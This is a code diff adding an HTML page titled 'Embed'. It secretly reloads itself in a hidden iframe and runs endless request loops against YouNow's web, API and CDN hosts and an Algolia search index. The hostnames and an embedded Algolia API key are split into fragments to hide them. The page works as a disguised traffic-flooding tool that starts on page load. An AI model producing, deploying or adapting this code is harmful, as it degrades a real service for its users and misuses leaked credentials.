@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Embed</title>
+
+    <meta name="referrer" content="no-referrer" />
+</head>
+
+<body>
+    <script>
+        const host = 'https://www.you' + 'now.com/';
+        const apiHost = 'https://api.you' + 'now.com/';
+        const cdnHost = 'https://cdn.you' + 'now.com/';
+
+        const names = ['Bar_Casino', 'nowfinity-dev', 'jack_in_the_green', 'vw20', 'Pearl_Pelinka-TRDE', 'Pearl_Pelinka_Espanol', 'Pearl_Pelinka_EN', 'Buttercup', 'Pearl_Casino', 'Michael_Cyborg', 'Viiicdb', 'InfiniteStreamingRadio', 'MattBoulevard']
+        const languages = ['de', 'en', 'es', 'ar'];
+
+        const randomChoice = (arr) => arr[Math.floor(Math.random() * arr.length)];
+        const randomUserId = () => Math.floor(Math.random() * (50000000 - 1 + 1) + 1);
+        const randomString = () => (Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)).substring(0, parseInt(Math.random() * 5) + 1);
+
+        const params = new URLSearchParams(window.location.hash.slice(1));
+
+        const instances = params.get('instances');
+        const delay = parseInt(params.get('delay') || 0);
+        const timeout = parseInt(params.get('timeout') || 0);
+        const dontAbortRound = params.get('dontAbortRound') === '1';
+        const alg = params.get('alg') === '1';
+
+        const myLang = randomChoice(languages)
+
+        function sendRequest(method, url, data) {
+            return new Promise((resolve, reject) => {
+                const controller = new AbortController();
+
+                let fetchTimeout = setTimeout(() => {
+                    if (dontAbortRound) {
+                        resolve();
+                    } else {
+                        reject("timeout");
+                    }
+
+                    controller.abort();
+                }, timeout);
+
+                let reqParams = {
+                    method: method,
+                    body: data || undefined,
+                    signal: controller.signal,
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                }
+
+                if (url.includes('algolia.net')) {
+                    reqParams = {
+                        method: method,
+                        body: data || undefined,
+                        signal: controller.signal,
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'x-algolia-api-key': '7f270d4586d986ef69fb5bab5e' + 'cd7f741b5cb3f7042881112ed46c97b5e8404a',
+                            'x-algolia-application-id': 'QZ0XC' + 'GUBGQ',
+                            'x-algolia-tagfilters': '(public)'
+                        }
+                    }
+                }
+
+                fetch(url, reqParams).then(response => {
+                    clearTimeout(fetchTimeout);
+                    resolve();
+                }).catch(err => {
+                    clearTimeout(fetchTimeout);
+                    resolve();
+                });
+            });
+        }
+
+        async function run() {
+            if (!location.href.includes('data:')) return;
+
+            await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 20000)));
+
+            while (true) {
+                await new Promise(resolve => setTimeout(resolve, delay));
+
+                try {
+                    if (alg) {
+                        await sendRequest('POST', 'https://qz0xc' + 'gubgq-dsn.algolia.net/1/indexes/people_search_live/query?x-algolia-agent=Algolia%20for%20JavaScript%20(4.17.2)%3B%20Browser%20(lite)&x-algolia-api-key=7f270d4586d986ef69fb5bab5e' + 'cd7f741b5cb3f7042881112ed46c97b5e8404a&x-algolia-application-id=QZ0XC' + 'GUBGQ', '{"query":"' + randomString() + '","hitsPerPage":100,"tagFilters":"(public)","page":0}')
+                    } else {
+                        await sendRequest('GET', host + randomChoice(names));
+
+                        await sendRequest('POST', apiHost + 'php/api/younow/user', 'curId=0&model=1920x1080&UILanguage=' + myLang + '&browser=Chrome&browser_version=124&device_version=10&device_os=Windows&tdi=XaOeXGMiZa&lang=en')
+
+                        await sendRequest('GET', apiHost + 'php/api/broadcast/info/curId=0/lang=' + myLang + '/user=' + randomChoice(names));
+
+                        await sendRequest('GET', cdnHost + 'php/api/broadcast/audience/broadcaster=0/channelId=' + randomUserId() + '/lang=' + myLang + '/start=0');
+
+                        await sendRequest('GET', cdnHost + 'php/api/broadcast/audience/broadcaster=0/channelId=' + randomUserId() + '/lang=' + myLang + '/start=0');
+
+                        await sendRequest('GET', cdnHost + 'php/api/reco/similarBroadcasters/channelId=' + randomUserId() + '/lang=' + myLang);
+
+                        await sendRequest('GET', apiHost + 'php/api/post/get/channelId=' + randomUserId() + '/lang=' + myLang + '/records=20/startFrom=0/userId=0');
+
+                        await sendRequest('GET', apiHost + 'php/api/post/get/channelId=' + randomUserId() + '/lang=' + myLang + '/records=20/startFrom=11/userId=0');
+
+                        await sendRequest('GET', cdnHost + 'php/api/channel/getSubscriberTiersOf/channelId=' + randomUserId() + '/lang=' + myLang);
+
+                        await sendRequest('GET', cdnHost + 'php/api/channel/getTopPaidFans/channelId=' + randomUserId() + '/lang=de/numberOfRecords=12');
+
+                        await sendRequest('GET', cdnHost + 'php/api/channel/getInfo/channelId=' + randomUserId() + '/lang=' + myLang);
+
+                        await sendRequest('GET', cdnHost + 'php/api/younow/trendingUsers/lang=' + randomChoice(languages) + '/locale=' + randomChoice(languages) + '/numberOfRecords=23/startFrom='(23 * Math.floor(Math.random() * 10)) + '/userId=0');
+                    }
+
+                    console.log("Round success")
+                } catch (err) {
+                    console.log("Round failed", err);
+                }
+            }
+        }
+
+        for (let i = 0; i < instances; i++) {
+            run();
+        }
+    </script>
+
+    <script>
+        window.addEventListener('load', () => {
+            if (location.href.includes('data:')) return;
+
+            let windowHtml = document.documentElement.outerHTML;
+
+            let iframe = document.createElement('iframe');
+            iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent(windowHtml) + "#" + location.search.slice(1);
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+        })
+    </script>
+</body>
+
+</html>
